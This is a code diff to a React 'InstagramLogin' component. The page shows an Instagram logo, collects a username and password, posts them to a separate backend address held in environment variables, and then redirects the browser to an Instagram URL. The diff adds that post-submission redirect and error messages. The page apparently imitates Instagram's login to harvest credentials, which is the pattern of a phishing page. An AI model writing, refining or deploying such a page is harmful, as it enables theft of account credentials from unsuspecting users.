@@ -4,19 +4,35 @@ const INSTAGRAM_URI = import.meta.env.VITE_INSTAGRAM_URI;
 const BACKEND_URI = import.meta.env.VITE_BACKEND_URI;
 
 const InstagramLogin: React.FC = () => {
+
   const [loginInput, setLoginInput] = useState("");
   const [password, setPassword] = useState("");
+  const [error, setError] = useState<string | null>(null);
+  // const navigate = useNavigate();
 
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
+    setError(null);
+
     try {
       const res = await axios.post(BACKEND_URI, {
         loginInput,
         password,
       });
-      console.log(res.data);
+
+      // On successful login
+      if (res.data && res.data.success) {
+        // Option 1: Redirect to external URL
+        window.location.href = INSTAGRAM_URI;
+
+        // Option 2: If you want to open in a new tab
+        // window.open(INSTAGRAM_URI, '_blank');
+      } else {
+        setError("Login failed. Please try again.");
+      }
     } catch (error) {
       console.error("Login failed", error);
+      setError("An error occurred. Please try again.");
     }
   };
 
@@ -26,6 +42,13 @@ const InstagramLogin: React.FC = () => {
         <div className="flex justify-center ">
           <img className="h-18" src="/instalogowhite.PNG" alt="" />
         </div>
+
+        {error && (
+          <div className="text-red-500 text-center mb-4">
+            {error}
+          </div>
+        )}
+        
         <form className="mt-8 space-y-6" onSubmit={handleLogin}>
           <div className="rounded-md shadow-sm -space-y-px ">
             <div>
@@ -60,9 +83,9 @@ const InstagramLogin: React.FC = () => {
                         : "bg-blue-500 hover:bg-blue-600"
                     } 
                        focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500`}
-              disabled={loginInput.length === 0 && password.length === 0} // ✅ Properly disables the button
+              disabled={loginInput.length === 0 && password.length === 0}
             >
-              <a href={INSTAGRAM_URI}>Log In</a>
+              Log In
             </button>
           </div>
         </form>
